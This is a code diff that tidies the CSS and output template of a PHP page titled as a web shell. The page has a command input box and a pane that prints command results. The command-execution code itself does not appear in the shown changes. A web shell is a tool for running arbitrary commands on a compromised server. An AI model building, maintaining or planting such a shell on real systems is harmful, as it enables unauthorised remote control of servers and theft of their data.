@@ -10,43 +10,23 @@ if (!empty($_POST["cmd"])) {
     <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css">
     <title>D0M BU$TЄR$ - PHP Web Shell</title>
     <style>
-      .line0>strong:nth-child(1) {
+      .line0>strong:nth-child(1),.line0>strong:nth-child(3),.line0>strong:nth-child(5),.line1>p:nth-child(1)   {
         color: #8ff0a4
       }
 
-      .line0>strong:nth-child(3) {
-        color: #8ff0a4
-      }
-
-      .line0>strong:nth-child(5) {
-        color: #8ff0a4
-      }
-
-      .line0>strong:nth-child(2) {
+      .line0>strong:nth-child(2),.line1>p:nth-child(2) {
         color: #3584e4
       }
-
-      .line1>p:nth-child(1) {
-        color: #8ff0a4
-      }
-
-      .line1>p:nth-child(2) {
-        color: #3584e4
-      }
-
       form {
         margin: 0
       }
-
       .form-control:focus {
         box-shadow: none
       }
-
       .line0 {
         margin: 0;
         font-size: 18px
       }
-
       #cmd {
         font-family: Hack, monospace;
         width: calc(100% - 70px);
@@ -58,7 +38,6 @@ if (!empty($_POST["cmd"])) {
         border: 0 gray solid;
         border-radius: 0
       }
-
       .line1 p {
         display: inline-grid;
         padding-right: 5px;
@@ -66,23 +45,19 @@ if (!empty($_POST["cmd"])) {
         font-size: 18px;
         font-weight: 700
       }
-
       body {
         font-family: font-family: Hack, monospace;
         color: #d9d8bd;
         background-color: #000
       }
-
       #cmd {
         background: 0 0;
         color: #d9d8bd;
         height: 17px
       }
-
       h2 {
         color: rgba(0, 0, 0, .75)
       }
-
       pre {
         padding: 0 0 0 6px;
         -webkit-border-radius: 5px;
@@ -95,7 +70,6 @@ if (!empty($_POST["cmd"])) {
         line-height: 1.6em;
         font-family: Hack, monospace
       }
-
       .container {
         width: 850px
       }
@@ -125,17 +99,18 @@ if (!empty($_POST["cmd"])) {
               <input type="text" class="form-control" name="cmd" id="cmd" value="" required="" autofocus>
             </div>
           </div>
-        </form> <?php if ($_SERVER["REQUEST_METHOD"] === "POST"): ?>
-        <?php if (isset($cmd)): ?>
-            <pre>
-				        <?= htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") ?>
-				    </pre>
-            <?php else: ?>
-                <pre>
-     						    <small>No result.</small>
-						    </pre>
-            <?php endif; ?>
-        <?php endif; ?>
+        </form>
+<?php if ($_SERVER["REQUEST_METHOD"] === "POST"): ?>
+<?php if (isset($cmd)): ?>
+<pre>
+<?=htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") ?>
+</pre>
+<?php else: ?>
+<pre>
+<small>No result.</small>
+</pre>
+<?php endif; ?>
+<?php endif; ?>
       </div>
     </main>
   </body>
